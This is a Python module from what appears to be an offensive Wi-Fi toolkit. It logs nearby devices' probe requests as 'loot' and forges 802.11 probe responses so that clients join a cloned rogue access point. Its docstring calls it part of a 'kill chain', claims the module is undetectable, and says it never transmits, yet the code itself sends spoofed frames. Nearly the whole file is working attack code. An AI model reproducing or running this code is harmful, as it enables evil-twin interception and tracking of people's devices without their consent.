"""Karma intelligence: passive probe-request listener.

Listens on the monitor interface for client probe requests (the SSIDs nearby
devices are looking for) and records them as device interests in the loot
(probes.json + devices.json). This is the "ears" of the kill chain: it tells
the operator what identity to adopt next. The listener is fully passive — it
never transmits probe responses, so it cannot be detected by antennas as an
AP storm (unlike PineAP-style auto-responders). Adoption is manual: the
operator picks an interest and re-clones the rogue AP to that SSID.
"""

import socket
import threading
import struct
import time

from . import config
from . import linuxutil
from . import state

PROBE_SUBTYPE = 0x04

# Idle channel-hop plan (MHz-standard, 2.4 + non-DFS/DFS 5). Passive listening
# is legal on DFS channels — only transmissions need radar detection — and the
# responder never runs idle, so hopping stays TX-free.
DEFAULT_HOP_CHANNELS = (
    ['%d' % c for c in range(1, 12)] + ['13'] +
    ['36', '40', '44', '48', '52', '56', '60', '64',
     '100', '104', '108', '112', '116', '120', '124', '128',
     '132', '136', '140', '144', '149', '153', '157', '161', '165']
)


class KarmaEngine(object):
    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._lock = threading.Lock()
        self._cmd = {'active': False, 'ssid': '', 'bssid': '',
                     'channel': '', 'mode': 'open', 'respond': False,
                     'hop': False, 'dwell': config.KARMA_HOP_DWELL}
        self._last_emit = {}
        self._last_resp = {}
        self._seq = 0
        self._hop_idx = 0
        self._known = set()
        self._mon = None
        self._no_mon_warned = False
        self._tx_warned = False
        self._tune_ok = True
        self._tune_fail_since = 0.0

    def _cmd_snapshot(self):
        with self._lock:
            return dict(self._cmd)

    def _monitor(self):
        """Resolve monitor vif, caching only a usable result (see deauth)."""
        if self._mon:
            return self._mon
        mon = linuxutil.ensure_monitor_iface()
        if mon:
            self._mon = mon
        return mon

    def set_cmd(self, **kw):
        with self._lock:
            self._cmd.update(kw)

    def _active(self):
        with self._lock:
            return bool(self._cmd.get('active'))

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None

    def _run(self):
        while not self._stop.is_set():
            try:
                self._cycle()
            except Exception as exc:
                state.emit('ALERT', 'karma: %s' % exc)
            self._stop.wait(1.0)

    def _cycle(self):
        cmd = self._cmd_snapshot()
        if not cmd.get('active'):
            self._stop.wait(2.0)
            return
        mon = self._monitor()
        if not mon:
            if not self._no_mon_warned:
                state.emit('ALERT', 'karma: no monitor interface available')
                self._no_mon_warned = True
            return
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((mon, 0))
            sock.settimeout(1)
        except OSError:
            if not self._no_mon_warned:
                state.emit('ALERT', 'karma: cannot bind %s' % mon)
                self._no_mon_warned = True
            return
        try:
            while not self._stop.is_set():
                cmd = self._cmd_snapshot()
                if not cmd.get('active'):
                    break
                if cmd.get('hop'):
                    # Shared-radio guard: when a retune fails (single-channel
                    # Realtek/rtw parked on a managed vif, DFS refusal, overseas
                    # channel the regdb bans, ...) the free-funt radio cannot be
                    # retuned. Degrade to pinned-listen on whatever channel it
                    # already sits — keep answering, stop fighting the radio —
                    # and only try hopping again after a backoff.
                    if self._tune_ok:
                        self._tune(cmd, mon)
                    else:
                        now = time.time()
                        if now - self._tune_fail_since >= config.KARMA_HOP_RETRY:
                            if self._tune(cmd, mon):
                                self._tune_ok = True
                        # one contiguous dwell per channel, then advance
                    window_start = time.time()
                    while not self._stop.is_set():
                        if not self._cmd_snapshot().get('active'):
                            break
                        remain = cmd.get('dwell', config.KARMA_HOP_DWELL) - (time.time() - window_start)
                        if remain <= 0:
                            break
                        try:
                            sock.settimeout(min(1.0, remain))
                            data = sock.recv(65535)
                        except socket.timeout:
                            continue
                        except OSError:
                            break
                        self._listen(data, sock)
                else:
                    # pinned: only the armed engines own the channel — karma
                    # listens continuously and never retunes the radio.
                    while not self._stop.is_set():
                        cmd = self._cmd_snapshot()
                        if not cmd.get('active'):
                            break
                        try:
                            sock.settimeout(1)
                            data = sock.recv(65535)
                        except socket.timeout:
                            continue
                        except OSError:
                            break
                        self._listen(data, sock)
                    break
        finally:
            sock.close()

    def _tune(self, cmd, mon):
        """Advance to the next channel in the idle hop plan.

        No-op unless THIS engine owns a hop cycle — when the chain is armed
        the deauth/capture engines pin the monitor to the target channel and
        karma must never retune it (that would fight their injection stream).
        """
        if not cmd.get('hop'):
            return None
        chans = config.KARMA_HOP_CHANNELS or list(DEFAULT_HOP_CHANNELS)
        ch = chans[self._hop_idx % len(chans)]
        self._hop_idx = (self._hop_idx + 1) % len(chans)
        returned = linuxutil.set_channel(mon, ch)
        if not returned and self._tune_ok:
            # alert only on the fail edge — a stubborn radio would otherwise
            # spam one ALERT per dwell for the whole cycle.
            self._tune_ok = False
            state.emit('ALERT', 'karma: channel %s tune failed on %s'
                       % (ch, mon))
        if returned:
            self._tune_ok = True
        return ch

    def _listen(self, data, sock=None):
        if len(data) < 20:
            return
        try:
            rt_len = struct.unpack('<H', data[2:4])[0]
        except struct.error:
            return
        if rt_len < 4 or rt_len > len(data) - 10:
            return
        w = data[rt_len:]
        if len(w) < 10:
            return
        fc = struct.unpack('<H', w[0:2])[0]
        if ((fc >> 2) & 3) != 0:           # management frame
            return
        if ((fc >> 4) & 0x0F) != PROBE_SUBTYPE:
            return
        mac = ':'.join('%02x' % b for b in w[10:16]).upper()
        probe_ssid = self._ssid_ie(w[24:])
        # Respond path first: broadcast probes carry no SSID IE at all, and
        # those are exactly the probes the responder exists for — saved-network
        # drivers re-probe with an empty wildcard when unknown/updating.
        if not mac or len(w) < 24:
            return
        self._respond_to(mac, probe_ssid, sock)
        if not probe_ssid:
            return
        state.append_probe(mac, probe_ssid)
        if mac not in self._known:
            self._known.add(mac)
            state.upsert_device(mac)
        if len(self._known) > config.MAX_DEVICES * 4:
            self._known = set(list(self._known)[-config.MAX_DEVICES * 2:])
        now = time.time()
        if now - self._last_emit.get(mac, 0) > 20:   # rate-limit events
            self._last_emit[mac] = now
            state.emit('PROBE', '%s is looking for "%s"' % (mac, probe_ssid))

    def _should_respond(self, probe_ssid, cmd):
        """Only ever advertise the live twin's identity.

        A directed probe for any OTHER network is never answered — claiming a
        network we are not serving would only drag the client into an
        association loss. Broadcast (wildcard) probes and probes for the
        current portal SSID are the accelerating ones.
        """
        if not cmd.get('respond'):
            return False
        ssid = cmd.get('ssid', '')
        bssid = cmd.get('bssid', '')
        if not ssid or not bssid:
            return False
        return not probe_ssid or probe_ssid == ssid

    def _respond_to(self, station, probe_ssid, sock):
        cmd = self._cmd_snapshot()
        if not self._should_respond(probe_ssid, cmd):
            return False
        now = time.time()
        if now - self._last_resp.get(station, 0) < config.KARMA_RESPOND_GAP:
            return False
        self._last_resp[station] = now
        if not sock:
            return False
        self._seq = (self._seq + 1) & 0x0FFF
        frame = self._probe_response_frame(
            cmd['ssid'], cmd['bssid'], station, cmd.get('channel', ''),
            seq=self._seq,
            privacy=cmd.get('mode', 'open') == 'wpa')
        try:
            sock.send(frame)
        except OSError:
            if not self._tx_warned:
                self._tx_warned = True
                state.emit('ALERT', 'karma: probe-response TX failed on %s'
                           % (self._mon or 'mon'))
            return False
        return True

    @staticmethod
    def _probe_response_frame(ssid, bssid, station, channel, seq=0,
                              privacy=False):
        """802.11 Probe Response: radiotap(flags+rate) + MAC header + body.

        The AP-side fields (timestamp, interval, rates, channel) are honest
        about the twin we are serving — minimal IEs, so the frame is small and
        the packet spends as little airtime as possible. `bssid` is the rogue
        BSSID (the cloned target MAC or the AP vif's own LA MAC) and `station`
        is the probing client, so the response is a direct, from-DS frame.
        """
        ssid_b = (ssid or '').encode('utf-8', 'replace')[:32]
        try:
            ch = int(channel) & 0xFF
        except (TypeError, ValueError):
            ch = 1
        try:
            bssid_b = bytes(int(x, 16) for x in bssid.split(':'))
            if len(bssid_b) != 6:
                return b''
            sta_b = bytes(int(x, 16) for x in station.split(':'))
            if len(sta_b) != 6:
                return b''
        except (ValueError, AttributeError):
            return b''
        # radiotap: ver0 pad0 len10 present(FLAGS|RATE), flags=0x00, rate=0x04 (2 Mb/s)
        frame = bytes([0x00, 0x00, 0x0A, 0x00, 0x06, 0x00, 0x00, 0x00,
                       0x00, 0x04])
        fc = 0x0050 | (1 << 9)                       # ProbeResp, FromDS
        frame += struct.pack('<H', fc)
        frame += struct.pack('<H', 0)                # duration/acl
        frame += sta_b                                # DA: the probe source
        frame += bssid_b                              # SA
        frame += bssid_b                              # BSSID
        frame += struct.pack('<H', (seq & 0x0FFF) << 4)
        body = b'\x00' * 8                           # timestamp (0)
        body += struct.pack('<H', 100)               # beacon interval 0.1024s
        cap = 0x0001                                 # ESS
        if privacy:
            cap |= 0x0010                            # privacy (WPA/PSK)
        body += struct.pack('<H', cap)
        body += bytes([0x00, len(ssid_b)]) + ssid_b  # SSID IE
        rates = bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])
        body += bytes([0x01, len(rates)]) + rates    # supported rates IE
        body += bytes([0x03, 0x01, ch])              # DS parameter set
        return frame + body

    @staticmethod
    def _ssid_ie(wlan_body):
        """Pull the SSID tagged parameter out of a probe request."""
        i = 0
        n = len(wlan_body)
        while i + 2 <= n:
            tag = wlan_body[i]
            length = wlan_body[i + 1]
            i += 2
            if i + length > n:
                break
            if length > 32:                 # table walk sanity
                return ''
            if tag == 0:
                try:
                    return wlan_body[i:i + length].decode('utf-8', 'replace')
                except UnicodeDecodeError:
                    return ''
            i += length
        return ''